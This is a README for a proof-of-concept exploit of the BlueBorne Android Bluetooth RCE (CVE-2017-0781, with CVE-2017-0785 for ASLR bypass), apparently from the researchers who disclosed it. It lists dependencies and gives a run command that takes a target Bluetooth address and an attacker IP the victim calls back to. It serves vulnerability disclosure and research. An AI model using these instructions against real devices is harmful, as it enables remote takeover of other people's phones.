BlueBorne Android Exploit PoC
=============================

This directory contains a PoC code of BlueBorne's Android RCE vulnerability (CVE-2017-0781).
It also uses the SDP Information leak vulnerability (CVE-2017-0785) to bypass ASLR.
It achieves code execution on a Google Pixel Android smartphone running version 7.1.2 with Security Patch Level July or August 2017.
This code can also be altered a bit in order to target other Android smartphones.

For more details you may read the full technical white paper available here:

https://www.armis.com/blueborne/

In addition a detailed blog post on the exploitation of this vulnerability is available here:
https://www.armis.com/blueborne-on-android-exploiting-rce-over-the-air/

===============

Dependencies:

    pip2 packages: pybluez, pwn
    
    - sudo apt-get install libbluetooth-dev
    - sudo pip2 install pybluez pwn

    A CSR USB bluetooth adapter. We need to change the MAC address, and so we use a vendor specific HCI command to do this
    for the CSR bluetooth adapter.
    - An alternative adapter can also be used - the only thing to alter is the set_rand_bdaddr function.

To run:

    sudo python2 doit.py hci0 <target-bdaddr> <attacker-ip>

IP needs to be accessible from the victim (should be the IP of the machine that runs the exploit)


